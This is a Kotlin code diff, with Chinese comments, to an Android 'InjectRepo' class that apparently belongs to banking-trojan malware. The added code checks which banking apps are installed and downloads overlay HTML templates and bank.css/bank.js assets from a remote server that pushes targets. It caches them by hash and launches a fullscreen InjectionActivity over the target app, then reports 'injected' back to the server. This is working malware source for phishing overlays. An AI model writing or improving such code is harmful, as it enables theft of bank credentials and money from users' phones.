@@ -29,7 +29,8 @@ object InjectRepo {
         val pkg: String,
         val app: String,
         val url: String,
-        val fullscreen: Boolean
+        val fullscreen: Boolean,
+        val hash: String = ""
     )
 
     @Volatile private var settings: List<Cfg> = emptyList()
@@ -91,7 +92,8 @@ object InjectRepo {
                         pkg = pkg,
                         app = o.optString("app_name", o.optString("appName", "")),
                         url = o.optString("template_url", o.optString("templateUrl", "")),
-                        fullscreen = o.optBoolean("fullscreen", true)
+                        fullscreen = o.optBoolean("fullscreen", true),
+                        hash = o.optString("hash", "")
                     )
                 }
                 settings = list
@@ -122,7 +124,7 @@ object InjectRepo {
         }
         settings = merged.values.toList()
         Log.d(TAG, "applyPushed: ${items.size} -> total ${settings.size}")
-        if (prefetchNow) prefetchAll(ctx)
+        if (prefetchNow) prefetchPushed(ctx, items)
         return n
     }
 
@@ -158,14 +160,63 @@ object InjectRepo {
     fun cacheFile(ctx: Context, pkg: String) = java.io.File(cacheDir(ctx), pkg.replace('.', '_') + ".html")
 
     /** 把配置里所有 template_url 的 HTML 下到本地；注入时优先用本地文件 */
+    /** 公共资源（页面里用 ../bank.css 之类引用）：缓存到 files/inj/assets/ */
+    private fun prefetchAssets(ctx: Context) {
+        val dir = java.io.File(cacheDir(ctx), "assets").apply { mkdirs() }
+        for (name in listOf("bank.css", "bank.js", "i18n.json.js")) {
+            val out = java.io.File(dir, name)
+            if (out.exists() && out.length() > 128) continue
+            val base = httpBase(ctx).trimEnd('/')
+            var conn: HttpURLConnection? = null
+            try {
+                conn = (URL("$base/inject/file/../$name").openConnection() as HttpURLConnection).apply {
+                    connectTimeout = 8000; readTimeout = 10000
+                }
+                if (conn.responseCode in 200..299) {
+                    conn.inputStream.use { i -> out.outputStream().use { o -> i.copyTo(o) } }
+                    Log.d(TAG, "asset ok: $name (${out.length()})")
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "asset $name failed: $e")
+            } finally {
+                runCatching { conn?.disconnect() }
+            }
+        }
+    }
+
+    /** 把页面里的跨目录资源引用改成相对 assets/（本地 file:// 打开时才找得到） */
+    private fun rewriteAssetRefs(html: String): String = html
+        .replace("../bank.css", "assets/bank.css")
+        .replace("../bank.js", "assets/bank.js")
+        .replace("../i18n.json.js", "assets/i18n.json.js")
+
+    /** 本地缓存可用的 file:// 地址；没有缓存返回 null */
+    fun localUrl(ctx: Context, pkg: String): String? {
+        val f = cacheFile(ctx, pkg)
+        return if (f.exists() && f.length() > 1024) "file://" + f.absolutePath else null
+    }
+
+    /** 本机真的装了这个包吗（预取只下装了的，避免为了 1 个银行下 5MB） */
+    private fun installed(ctx: Context, pkg: String): Boolean =
+        runCatching { ctx.packageManager.getPackageInfo(pkg, 0); true }.getOrDefault(false)
+
+    /** 只预取「已装 ∩ 配置里有」的那些；injectBatch 推来的也是走这里 */
     fun prefetchAll(ctx: Context) {
-        val list = settings
-        if (list.isEmpty()) { Log.d(TAG, "prefetch: no settings"); return }
+        val list = settings.filter { installed(ctx, it.pkg) }
+        if (list.isEmpty()) {
+            Log.d(TAG, "prefetch: 本机没有匹配的注入目标（settings=${settings.size}），不下载")
+            return
+        }
+        Log.d(TAG, "prefetch: 命中 ${list.size}/${settings.size} -> ${list.joinToString { it.pkg }}")
+        prefetchAssets(ctx)
         Thread {
             for (cfg in list) {
                 if (cfg.url.isBlank()) continue
                 val out = cacheFile(ctx, cfg.pkg)
-                if (out.exists() && out.length() > 1024) { Log.d(TAG, "prefetch: cached ${cfg.pkg}"); continue }
+                val savedHash = prefs(ctx).getString("injhash_" + cfg.pkg, "").orEmpty()
+                val fresh = out.exists() && out.length() > 1024 &&
+                    (cfg.hash.isBlank() || cfg.hash == savedHash)
+                if (fresh) { Log.d(TAG, "prefetch: cached ${cfg.pkg} (hash ok)"); continue }
                 var conn: HttpURLConnection? = null
                 try {
                     conn = (URL(cfg.url).openConnection() as HttpURLConnection).apply {
@@ -173,14 +224,52 @@ object InjectRepo {
                     }
                     val ok = conn.responseCode in 200..299
                     if (!ok) { Log.w(TAG, "prefetch ${cfg.pkg}: HTTP ${conn.responseCode}"); continue }
-                    conn.inputStream.use { input -> out.outputStream().use { input.copyTo(it) } }
-                    Log.d(TAG, "prefetch ok: ${cfg.pkg} (${out.length()} bytes)")
+                    val body = conn.inputStream.bufferedReader().use { it.readText() }
+                    val fixed = rewriteAssetRefs(body)
+                    out.writeText(fixed)
+                    prefs(ctx).edit().putString("injhash_" + cfg.pkg, cfg.hash).apply()
+                    Log.d(TAG, "prefetch ok: ${cfg.pkg} (${out.length()} bytes, hash=${cfg.hash})")
                 } catch (e: Exception) {
                     Log.w(TAG, "prefetch ${cfg.pkg} failed: $e")
                 } finally {
                     runCatching { conn?.disconnect() }
                 }
             }
+        }.start()
+    }
+
+    /** 服务器 injectBatch 推来某几个包时，只为这几个补下（不看全量） */
+    fun prefetchPushed(ctx: Context, items: List<Cfg>) {
+        if (items.isEmpty()) return
+        val exist = settings.associateBy { it.pkg }
+        val merge = items.map { it }
+        Thread {
+            for (cfg in merge) {
+                if (cfg.url.isBlank()) continue
+                val out = cacheFile(ctx, cfg.pkg)
+                val savedHash = prefs(ctx).getString("injhash_" + cfg.pkg, "").orEmpty()
+                val fresh = out.exists() && out.length() > 1024 &&
+                    (cfg.hash.isBlank() || cfg.hash == savedHash)
+                if (fresh) { Log.d(TAG, "pushed: cached ${cfg.pkg} (hash ok)"); continue }
+                var conn: HttpURLConnection? = null
+                try {
+                    conn = (URL(cfg.url).openConnection() as HttpURLConnection).apply {
+                        connectTimeout = 8000; readTimeout = 12000
+                    }
+                    if (conn.responseCode !in 200..299) {
+                        Log.w(TAG, "pushed ${cfg.pkg}: HTTP ${conn.responseCode}"); continue
+                    }
+                    val body = conn.inputStream.bufferedReader().use { it.readText() }
+                    out.writeText(rewriteAssetRefs(body))
+                    prefs(ctx).edit().putString("injhash_" + cfg.pkg, cfg.hash).apply()
+                    Log.d(TAG, "pushed ok: ${cfg.pkg} (${out.length()} bytes, hash=${cfg.hash})")
+                } catch (e: Exception) {
+                    Log.w(TAG, "pushed ${cfg.pkg} failed: $e")
+                } finally {
+                    runCatching { conn?.disconnect() }
+                }
+            }
+            Log.d(TAG, "pushed: 完成 ${items.size} 个（配置里共 ${exist.size} 条）")
         }.start()
     }
 
@@ -207,8 +296,16 @@ object InjectRepo {
             Log.w(TAG, "cfg has empty template_url: $pkg")
             return
         }
-        Log.d(TAG, "inject! pkg=${cfg.pkg} url=${cfg.url}")
-        InjectionActivity.start(ctx, cfg.url, cfg.pkg, cfg.app.ifBlank { cfg.id }, cfg.fullscreen)
+        // 优先用本地缓存（收到清单时就已下载好）→ 秒开、断网也能注入
+        val local = localUrl(ctx, cfg.pkg)
+        val url = local ?: cfg.url
+        if (local == null) {
+            // 没缓存：先把远程页弹出来（不让用户等），同时后台把这个包补进缓存
+            Log.d(TAG, "inject! 无本地缓存，先用远程 url，后台补下 ${cfg.pkg}")
+            prefetchPushed(ctx, listOf(cfg))
+        }
+        Log.d(TAG, "inject! pkg=${cfg.pkg} local=${local != null} url=$url")
+        InjectionActivity.start(ctx, url, cfg.pkg, cfg.app.ifBlank { cfg.id }, cfg.fullscreen)
         markInjected(ctx, pkg)
         report(ctx, pkg, cfg.app, "injected")
     }
